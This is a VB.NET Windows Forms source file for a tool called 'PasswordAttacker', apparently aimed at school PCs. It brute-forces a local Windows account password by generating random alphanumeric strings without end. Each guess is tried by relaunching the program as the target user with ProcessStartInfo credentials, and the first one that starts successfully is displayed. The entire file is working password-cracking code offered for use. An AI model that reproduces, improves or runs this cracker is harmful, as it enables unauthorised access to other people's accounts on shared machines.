Imports System.Reflection
Imports PasswordAttacker.SchoolPCChecker
Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        If Environment.GetCommandLineArgs.Contains("PasswordTest") Then
            Application.Exit()
        End If
    End Sub
    Private Sub StartAttack_Click(sender As Object, e As EventArgs) Handles StartAttack.Click
        Attacker.RunWorkerAsync()
    End Sub
    Private Sub Attacker_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles Attacker.DoWork
        Const Chars As String = "01234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        While True
            Dim l = CInt((VBMath.Rnd * (20 - 8)) + 7)
            Dim s As String = ""
            For a = 1 To l
                s += Chars(VBMath.Rnd * (Chars.Length - 1))
            Next
            ProcessText = s
            If CheckPassword(s) Then
                ResultText = s
                Return
            End If
        End While
    End Sub
    Private Property ResultText As String
        Get
            Return Invoke(Function()
                              Return AttackResult.Text
                          End Function)
        End Get
        Set(value As String)
            Invoke(Sub()
                       AttackResult.Text = value
                   End Sub)
        End Set
    End Property
    Private Property ProcessText As String
        Get
            Return Invoke(Function()
                              Return AttackingPassword.Text
                          End Function)
        End Get
        Set(value As String)
            Invoke(Sub()
                       AttackingPassword.Text = value
                   End Sub)
        End Set
    End Property
    Private Function CheckPassword(pw As String) As Boolean
        Try
            Dim si As New ProcessStartInfo
            si.FileName = System.Reflection.Assembly.GetEntryAssembly().Location
            si.Arguments = """PasswordTest"""
            si.UserName = GetUN()
            Dim ssPwd As New System.Security.SecureString()
            For Each c As Char In pw
                ssPwd.AppendChar(c)
            Next
            si.Password = ssPwd
            si.UseShellExecute = False
            Process.Start(si)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
End Class
